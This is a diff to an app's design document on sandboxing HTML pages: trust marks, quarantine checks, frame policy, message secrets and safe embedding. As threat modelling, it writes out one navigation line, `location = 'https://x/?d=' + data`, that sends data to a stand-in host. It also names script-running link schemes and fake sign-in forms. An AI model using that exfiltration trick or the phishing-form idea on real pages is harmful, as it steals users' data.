@@ -3,11 +3,11 @@
 **Status (2026-11-26).** M1 to M4 are built on the `worktree-html-pages` branch. Where it differs from the plan below: a
 foreign page allowed to read runs none of its scripts (§1, *Reading plus a way out*), so its reads are only its
 `<golem-embed>` elements, and the `golem` API serves own pages only; writes need no prompt for an own page, and each is a
-run in Tools › Scripts' log with Undo This Run. Not done yet: checking the frame in the real web views (WKWebView inside
-Tauri, WebView2, WebKitGTK), a manual screen reader pass of page view, Download in a shared page's view, and `saved_by` for saves a
-shared room makes (only `PUT` sets it). The "came in from outside" mark is per device, so a page opened from the computer
-on one device is own on the person's others. Links in a page whose scripts don't run can't be handed to the app (nothing in
-the frame can catch the click), so following one only shows the page again.
+run in Tools › Scripts' log with Undo This Run. Where a page came from follows the account (`documents.outside`, §1), so a page
+imported or downloaded on one device is foreign on the person's others too. Not done yet: checking the frame in the real web
+views (WKWebView inside Tauri, WebView2, WebKitGTK), a manual screen reader pass of page view, and Download in a shared page's
+view. Links in a page whose scripts don't run can't be handed to the app (nothing in the frame can catch the click), so
+following one only shows the page again.
 
 **How it works.** `client/src/pages/`: `compose.ts` (what makes a file a page, its metas, the policy, inlining its files,
 filling its embeds, the frame's page and the runtime that gives it `golem`), `trust.ts` (own or foreign, and what this
@@ -16,8 +16,8 @@ device remembers), `embedHtml.ts` (a live block's result as HTML), `requests.ts`
 `dialogs.ts`: one chunk, loaded behind `entry.ts` the first time a page is shown. `detect.ts` and `trust.ts`'s `PageMemory` are
 always loaded, since they decide how an HTML file opens. main.ts opens an HTML file as a page (`openPage`, document kind `page`), and View › HTML as Page / as
 Document / Source switch (`setHtmlView`). The site's viewer shows a shared page with `viewer/sharedPage.ts`. The server keeps
-`documents.saved_by` and a page's results (`/api/documents/:id/page`, `/api/view|public/:token/page`); the desktop shell has
-`vault_downloaded`. Tests: `client/test/pages.test.ts`, `server/test/pages.test.ts`, `e2e/pages/page-view.spec.ts`,
+`documents.outside` (and `saved_by`), the owner's word on it (`PUT /api/documents/:id/outside`), and a page's results
+(`/api/documents/:id/page`, `/api/view|public/:token/page`); the desktop shell has `vault_downloaded`. Tests: `client/test/pages.test.ts`, `server/test/pages.test.ts`, `e2e/pages/page-view.spec.ts`,
 `e2e/accessibility/page-view.spec.ts`, `e2e/collab/share-page.spec.ts`, and
 `downloaded_reads_the_quarantine_mark` in `desktop/src-tauri/src/vault.rs`.
 
@@ -78,15 +78,30 @@ So a page is either **own** or **foreign**, decided by where its bytes came from
 - **Own:** every save of it came from this account: typed or saved in the app, or written into the vault folder on this
   person's computer, by them or an agent they run.
 - **Foreign:**
-  - created or last changed by another account (`created_by`, and the last saver, from [folder sharing](folder-sharing.md)):
-    an editor changing the person's own page makes it foreign until the person marks it own again;
+  - created or changed by another account: an editor's save, a document an editor added to a shared folder, and a room save
+    that carried an edit from someone else all set `documents.outside` to 1 on the server ([folder sharing](folder-sharing.md));
+    the owner's own saves leave it as it is. The owner's listing then says `byOther: true` (older rows, from before `outside`,
+    fall back to `created_by` and `saved_by`), so an editor changing the person's page makes it foreign on every device until
+    the person marks it own again;
   - opened or imported from outside the vault (File › Open, a drop, an upload, an email attachment);
   - written into the vault folder with the operating system's download mark (macOS's `com.apple.quarantine`, Windows'
-    `Zone.Identifier`), which browsers and mail apps put on what they save. The desktop shell reads it when it picks up the
-    file (a new shell command, behind `desktop/bridge.ts`; an older shell treats every file on disk as own).
+    `Zone.Identifier`), which browsers and mail apps put on what they save. The desktop shell reads it
+    (`vault_downloaded`, behind `desktop/bridge.ts`). A shell too old to have that command can't tell (`downloaded()` gives
+    null), and that counts as downloaded: on such a shell, a page from the vault folder is foreign until marked.
 
-**Mark as Mine** (in page view's bar) makes a foreign page own, after showing what it asks for. The mark is per device,
-like a script's grant, and is lost when another account changes the page.
+What one device sees, the account learns: when the app finds that a page the person owns came from outside (imported on this
+device, or with the download mark; never for an old shell's "can't tell"), it says so once for those bytes,
+`PUT /api/documents/:id/outside {outside: true}` (owner only; `PageMemory` remembers which bytes it reported), so the page is
+foreign on the person's other devices too.
+
+**Mark as Mine** (in page view's bar) makes a foreign page own, after showing what it asks for. On this device it keeps the
+mark for these bytes (their SHA-256, `fingerprint` in `trust.ts`; a mark kept by an earlier app with another fingerprint no
+longer matches, so the page asks again), forgets that the page came from outside, and, if its file had the download mark,
+remembers that the person accepted it (`acceptedDownload`), so the mark on the file no longer counts once they edit the page.
+In the account it says `{outside: false}`, so their other devices treat it as theirs. A change by another account makes it
+foreign again. A page not yet kept (opened from the computer) is marked for this session only (`SessionGrants`), for its
+bytes: another file of the same name is not trusted by it. "Allow Once" reads work the same way. This device never forgets a
+page that came from outside, or one whose download it accepted, when it trims what it remembers (`trimRecords`).
 
 ### Reading plus a way out
 
@@ -114,6 +129,9 @@ together, and the ways out are more than `fetch`:
   frame (`location = 'https://x/?d=' + data`), which no Content-Security-Policy stops, so a policy without the network is
   not enough. The app fills its embeds before showing it, and `<meta http-equiv="refresh">` is taken out of every page.
 - **Links out of a foreign page** that may read are opened by the app, which shows the full address and asks first.
+- **Forms** post only from an own page in the app (`allow-forms`, `form-action https:`). A foreign page, and every page shown to
+  someone it is shared with, gets neither (`PagePolicy.forms`): it could draw a sign-in form under the app's address and post
+  what is typed anywhere.
 - **Sharing a page** lists the documents its last run read before making a link (§5).
 
 ## 2. Showing a page (M1)
@@ -126,6 +144,11 @@ together, and the ways out are more than `fetch`:
   Document read as the page breaking. The choice is remembered per file on the device.
 - **The frame** is a `srcdoc` iframe as in scripts' sandbox, with the CSP of §1 set by a `<meta http-equiv>` the host puts
   first in `<head>`. The page's own CSP, if any, can only narrow it.
+- **Messages.** Each load of the frame gets a new random secret (`RuntimeStart.token`, `newToken`), put in its runtime. Every
+  message the runtime sends carries it, and the app takes nothing without it (`frameMessage`); its replies and updates carry it
+  too and go only while that load is there. A page that is leaving (`pagehide`) says so, and nothing is answered until it is
+  shown again with a new secret. Without this, a document the frame moved on to (a form posted to another site, a script
+  setting `location`) would share the frame's window and could ask for the vault in the page's name.
 - **Relative files.** An opaque origin cannot fetch from the vault. Before showing a page the host reads every relative
   `src`, `href` and `url()` (`chart.png`, `style.css`, `lib.js`, a CSS `@import`) from the vault, relative to the page's
   folder, and inlines it as a `data:` address, as `collectImages` does for export. An own page reaches the whole vault. A
@@ -139,7 +162,8 @@ together, and the ways out are more than `fetch`:
   and top navigation are not allowed (`allow-popups` and `allow-top-navigation` are off).
 - **Reloading.** A save of the page, or of a file it inlined, reloads the frame, keeping its scroll position.
 - **Accessibility.** The frame is ordinary HTML, so screen readers read it; the bar is an F6 region; Escape moves focus
-  from the frame to the bar.
+  from the frame to page view's region (not onto one of the bar's buttons, where a page could otherwise put the person's next
+  key).
 
 ## 3. Embedding documents (M2)
 
@@ -147,7 +171,9 @@ Two ways in, both resolved by the host through `resultOf`:
 
 - **Declarative:** `<golem-embed src="Q3 Report.docx#table:Totals"></golem-embed>`. The host fills it before showing the
   page and again on each change: a table or blocks as HTML (`documentToHtml`, with the document's styles), a picture,
-  chart, drawing or PDF page as an `<img>` with a `data:` PNG (or the SVG inline), a value as text. Options after `?` work
+  chart, drawing or PDF page as an `<img>` with a `data:` PNG, or a drawing as an `<img>` of its SVG (never inline: an SVG from
+  anyone could hold a script), a value as text. A document's links that would run code (`javascript:`, `vbscript:`,
+  `data:`) are made inert (`safeLinks`); the HTML writer escapes everything else and leaves out what it keeps verbatim. Options after `?` work
   as in live blocks (`Books/?where=status:read&sort=-finished`). An error shows in place with its reason. This covers most
   dashboards without code.
 - **Script API:** a small `golem` object the host puts in the frame, the same vocabulary as `@golemdocs/script`'s
@@ -176,7 +202,9 @@ A shared page (Can view, or the public link, `/view?p=`) opens in page view in t
 cannot reach the owner's vault, so a shared page is **baked**: when the owner saves it or shares it, the owner's app runs
 it, resolves every embed and every read it made, and stores the results with the page (an extension of the stored file,
 never the vault's `.html`). The viewer answers the page's `golem` calls from the baked results only, and follows saves as
-it does today.
+it does today. *Built:* the results are `/api/documents/:id/page`, which only the owner may write (an editor's would be their
+own vault's); nothing is kept when the page read an encrypted document (`readsAny` in `keepResults`), since the results are
+plain text on the server. The page runs with an own page's policy but no forms.
 
 - **Before sharing,** File › Share lists the documents the last run read ("This page shows parts of 6 documents: …"). A
   page shared publicly publishes them.
